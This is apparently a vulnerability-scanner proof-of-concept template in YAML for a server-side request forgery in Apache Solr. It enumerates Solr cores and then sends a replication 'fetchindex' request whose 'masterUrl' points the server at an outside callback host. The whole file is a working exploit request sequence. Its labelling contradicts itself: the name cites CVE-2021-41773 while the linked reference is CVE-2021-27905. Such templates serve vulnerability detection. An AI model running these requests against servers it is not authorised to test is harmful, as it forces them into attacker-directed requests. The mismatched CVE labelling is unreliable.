name: poc-yaml-solr-cve-2021-41773-ssrf
manual: true
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
  - method: GET
    path: "/solr/admin/cores?indexInfo=false&wt=json"
    expression: |
      response.status == 200 
    search: >-
      "name":"(?P<name>.+?)"
  - method: POST
    path: "/solr/{{name}}/replication/?command=fetchindex&masterUrl={{reverseURL}}"
    expression: |
      reverse.wait(5)
detail:
    author: txf(https://github.com/tangxiaofeng7)
    links:
        - https://github.com/murataydemir/CVE-2021-27905